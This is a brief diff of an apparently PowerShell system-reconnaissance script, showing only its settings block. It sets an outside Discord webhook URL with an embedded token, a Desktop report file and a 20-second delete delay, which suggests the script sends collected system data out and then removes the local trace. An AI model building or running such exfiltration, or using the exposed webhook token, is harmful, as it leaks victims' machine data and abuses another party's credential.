@@ -1,7 +1,6 @@
+# ========== НАСТРОЙКИ ==========
 $webhookUrl = "https://discord.com/api/v10/webhooks/1380240005724770304/ZXWZ-qvvwloOPEwnZqw9wHNi1uuDVK_kmdNGzokReEyjqsHo8m6oDbbjrO2-XBlEctYP"  # 🔴 ОБЯЗАТЕЛЬНО ЗАМЕНИ НА СВОЙ!More actions
-
-$reportPath = "$env:USERPROFILE\Desktop\System_Report.json"
-
+$reportPath = "$env:USERPROFILE\Desktop\System_Universal_Report.json"
 $deleteDelaySeconds = 20
 
 # ========== Расширенный рекогнайз ==========
